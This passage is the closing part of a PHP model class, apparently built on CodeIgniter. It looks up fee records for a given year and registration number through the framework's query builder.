      $this->db->where('current_year',$year);
      $this->db->where('reg_no',$reg_no);
      return $this->db->get('fees'); 
    }

}
?>